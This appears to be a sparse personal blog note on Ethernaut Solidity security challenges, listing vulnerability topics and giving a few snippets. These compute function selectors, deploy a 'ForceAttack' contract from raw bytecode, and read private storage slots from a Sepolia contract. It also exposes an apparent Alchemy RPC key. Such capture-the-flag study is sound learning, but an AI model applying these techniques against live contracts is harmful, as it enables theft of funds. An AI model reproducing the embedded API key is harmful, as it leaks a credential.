---
author: "Simon"
title: "Ethereum Naut"
date: 2024-03-01T22:16:01+08:00
description: "ethereum naut "
tags: ["solidity"]
ShowToc: false
ShowBreadCrumbs: false
---

https://github.com/crytic/slither
https://quillaudits.medium.com/

https://solidity-by-example.org/hacks/accessing-private-data/
https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html#
https://fisco-bcos-documentation.readthedocs.io/zh-cn/latest/docs/articles/3_features/35_contract/solidity_operation_principle.html

### 1. Fallback

### 2. 同名 constructor

### 3. block.number

### 4. msg.origin msg.sender

### 5. math

### 6. delegateCall

> 1. get function prototype

```
function withdraw(uint withdraw_amount) public;
    -> withdraw(uint256)



    pay(uint256,uint256,uint256,bytes32,bytes32,uint8,bytes32,bytes32,address)

```

> 2. get fun selector , and set params

```

const method = Web3.utils.sha3("pwn()").slice(0, 10);
> web3.utils.sha3("withdraw(uint256)");
'0x2e1a7d4d 13322e7b96f9a57413e1525c250fb7a9021cf91d1540d5b69f16a49f'
> withdraw_amount = web3.utils.toWei(0.01, "ether");
'10000000000000000'
> withdraw_amount_hex = web3.utils.toHex(withdraw_amount);
'0x2386f26fc10000'

withdraw_amount_hex.slice(2).padStart(64, "0");
//  (padded to 32 bytes):
2e1a7d4d 000000000000000000000000000000000000000000000000002386f26fc10000
```

### 7. deploy contract

```
// solc --bin ForceAttack.sol
<!-- get bytecode -->
// data =  bytecode + encoded parma
await sendTransaction({
    from: player,
    to: 0,
    data: '60806040526040516100c13803806100c1833981810160405281019060239190604f565b8073ffffffffffffffffffffffffffffffffffffffff16ff5b60008151905060498160ac565b92915050565b600060208284031215606257606160a7565b5b6000606e84828501603c565b91505092915050565b60006080826087565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b60b3816077565b811460bd57600080fd5b5056fe000000000000000000000000dcf00b70aae75046de7063e10f55f5aa82ec4f01'
});
```

### 8, storage

single 32-byte slot, 2\*\*256 slots

```
uint8    => 1 byte
uint16   => 2 bytes and so on
uint256  => 32 bytes
bool     => 1 byte
address  => 20 byte
bytes1   => 1 byte
bytes2   => 2 bytes and so on
```

```javascript
const rpc_url =
  "https://eth-sepolia.g.alchemy.com/v2/ifhAyycQf9EQGFKGb7bkZKpVf-wGX3Z9"; //add your rpc_url here
const provider = new ethers.JsonRpcProvider(rpc_url);
const contract_address = "0x3c28d43ed4805B60D3Ae58CEF75C13c557475B94"; //add contract address here
const slot = 1; // add the storage slot of contract you want to access
const data = await provider.getStorage(contract_address, slot);
console.log("Private Data :", data);
```

### 9.transfer check fallback

### 10.Re-entrancy
